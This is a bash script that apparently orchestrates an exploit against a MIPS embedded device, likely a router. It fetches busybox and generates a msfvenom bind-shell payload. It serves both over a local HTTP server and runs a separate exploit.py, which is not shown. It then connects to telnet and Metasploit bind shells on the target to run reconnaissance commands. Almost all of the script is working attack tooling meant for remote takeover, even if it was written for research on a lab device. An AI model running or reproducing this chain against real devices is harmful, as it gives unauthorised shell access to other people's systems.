#!/bin/bash

if [ ! -f busybox-mipsel ]; then
curl -o busybox-mipsel https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-mipsel
fi

msfvenom -p linux/mipsle/shell_bind_tcp RHOST=0.0.0.0 LPORT=12345 -f elf > bind_shell

sudo fuser -k 8000/tcp
python3 -m http.server 8000 &

python3 exploit.py

sleep 5

#keep stdin open so that we can get the results back
echo "telnet bind shell:"
sh -c 'echo "cd /tmp; ./busybox whoami; ./busybox id; ./busybox uname -a; ps"; sleep 5 ' | telnet 192.168.10.1 23456

echo "metaploit bind shell:"
sh -c 'echo "netstat -lpn; ls -al /tmp"; sleep 5 ' | nc -v -n -w 5 192.168.10.1 12345